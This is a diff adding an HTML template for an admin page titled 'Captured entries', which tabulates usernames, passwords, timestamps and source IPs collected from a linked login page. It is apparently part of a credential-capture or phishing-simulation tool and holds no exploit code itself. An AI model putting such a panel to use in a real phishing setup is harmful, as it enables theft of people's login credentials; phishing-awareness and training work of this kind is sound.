@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Admin - Captured Entries</title>
+    <link rel="stylesheet" href="/static/style.css" />
+    <style>
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 1rem;
+      }
+      th,
+      td {
+        text-align: left;
+        padding: 0.5rem;
+        border-bottom: 1px solid #eee;
+        font-family: inherit;
+        font-size: 0.95rem;
+      }
+      .actions {
+        margin-top: 1rem;
+      }
+      .danger {
+        background: #e63946;
+        color: #fff;
+        border: none;
+        padding: 0.5rem 0.8rem;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+      .info {
+        background: #2a9d8f;
+        color: #fff;
+        border: none;
+        padding: 0.5rem 0.8rem;
+        border-radius: 6px;
+        cursor: pointer;
+        margin-left: 0.5rem;
+      }
+      small {
+        color: #666;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Captured entries</h1>
+
+      {% if entries %}
+      <table>
+        <thead>
+          <tr>
+            <th>Timestamp (UTC)</th>
+            <th>Username</th>
+            <th>Password (masked)</th>
+            <th>Source IP</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for e in entries %}
+          <tr>
+            <td>{{ e.timestamp }}</td>
+            <td>{{ e.username }}</td>
+            <td>{{ e.password }}</td>
+            <td>{{ e.source_ip }}</td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+      {% else %}
+      <p>No captured entries yet.</p>
+      {% endif %}
+
+      <div class="actions">
+        <form method="post" action="/admin/clear" style="display: inline">
+          <label style="display: none">
+            <input name="token" type="text" value="" />
+          </label>
+          <button
+            type="submit"
+            class="danger"
+            onclick="return confirm('Clear all captured entries?')"
+          >
+            Clear all
+          </button>
+        </form>
+
+        <a class="info" href="/">Open login page</a>
+      </div>
+
+    </div>
+  </body>
+</html>
